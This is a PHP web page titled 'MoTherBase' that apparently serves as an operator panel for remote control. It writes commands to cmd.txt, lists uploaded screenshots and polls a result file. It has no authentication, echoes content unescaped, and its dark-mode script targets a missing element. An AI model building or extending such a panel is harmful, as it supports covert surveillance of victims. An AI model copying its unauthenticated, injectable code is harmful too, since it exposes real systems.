<!DOCTYPE html>
<html>
<head>
	<title>MoTherBase</title>
	<style type="text/css">
		body {
			background-color: #222;
			color: #ddd;
			font-family: Arial, sans-serif;
			font-size: 14px;
			line-height: 1.5em;
			margin: 0;
			padding: 0;
		}
		h1 {
			font-size: 24px;
			margin-bottom: 20px;
		}
		textarea {
			background-color: #333;
			border: 1px solid #444;
			color: #ddd;
			font-family: "Courier New", Courier, monospace;
			font-size: 14px;
			height: 300px;
			padding: 10px;
			width: 100%;
		}
		input[type="submit"] {
			background-color: #444;
			border: 1px solid #555;
			color: #ddd;
			cursor: pointer;
			font-size: 14px;
			padding: 10px;
		}
		table {
			border-collapse: collapse;
			margin-top: 20px;
			width: 100%;
		}
		th, td {
			border: 1px solid #444;
			padding: 5px;
			text-align: center;
		}
		th {
			background-color: #555;
			color: #ddd;
		}
		td a {
			color: #ddd;
			text-decoration: none;
		}
		.readonly {
			background-color: #333;
			border: 1px solid #444;
			color: #ddd;
			font-family: "Courier New", Courier, monospace;
			font-size: 14px;
			height: 300px;
			padding: 10px;
			width: 100%;
		}
		.result {
			background-color: #333;
			border: 1px solid #444;
			color: #ddd;
			font-family: "Courier New", Courier, monospace;
			font-size: 14px;
			height: 100px;
			padding: 10px;
			width: 100%;
		}
	</style>
</head>
<body>
	<h1>File Editor</h1>

	<?php
	$file_name = 'cmd.txt';
	$dir_name = 'screenshots/';
	$result_file = 'result.txt';

	// Handle form submission
	if (isset($_POST['contents'])) {
		$contents = $_POST['contents'];
		if (file_put_contents($file_name, $contents)) {
			echo '<p>File saved!</p>';
		} else {
			echo '<p>Error saving file.</p>';
		}
	}

	// Display text editor
	echo '<div id="edit">';
	echo '<form method="post">';
	echo '<textarea name="contents">' . file_get_contents($file_name) . '</textarea>';
	echo '<br>';
	echo '<input type="submit" value="Save">';
	echo '</form>';
	echo '</div>';

	// Display screenshot files
	echo '<div id="screenshots">';
	echo '<h2>Screenshots</h2>';
	echo '<table>';
	echo '<tr><th>File Name</th><th>Size</th><th>Modified</th></tr>';
	$files = scandir($dir_name);
	foreach ($files as $file) {
	    if (!in_array($file, array(".", ".."))) {
	        $path = $dir_name . $file;
	        echo '<tr>';
	        echo '<td><a href="' . $path . '">' . $file . '</a></td>';
	        echo '<td>' . filesize($path) . ' bytes</td>';
	        echo '<td>' . date("Y-m-d H:i:s", filemtime($path)) . '</td>';
	        echo '</tr>';
	    }
	}
	echo '</table>';
	echo '</div>';

	// Display result file
	echo '<div id="result">';
	echo '<h2>Result</h2>';
	echo '<textarea class="result" readonly></textarea>';
	echo '</div>';
	?>

	<script type="text/javascript">
		// Refresh the result every 5 seconds
		setInterval(function() {
			var xhr = new XMLHttpRequest();
			xhr.onreadystatechange = function() {
				if (xhr.readyState === 4 && xhr.status === 200) {
					document.querySelector('#result textarea').value = xhr.responseText;
				}
			}
			xhr.open('GET', '<?php echo $result_file; ?>', true);
			xhr.send();
		}, 5000);
		// Dark mode toggle
		var darkMode = localStorage.getItem('darkMode');
		if (darkMode === 'enabled') {
			enableDarkMode();
		}

		function enableDarkMode() {
			document.body.classList.add('dark-mode');
			localStorage.setItem('darkMode', 'enabled');
		}

		function disableDarkMode() {
			document.body.classList.remove('dark-mode');
			localStorage.setItem('darkMode', null);
		}

		var darkModeToggle = document.querySelector('#dark-mode-toggle');
		darkModeToggle.addEventListener('click', function() {
			darkMode = localStorage.getItem('darkMode');
			if (darkMode !== 'enabled') {
				enableDarkMode();
			} else {
				disableDarkMode();
			}
		});
	</script>
</body>
</html>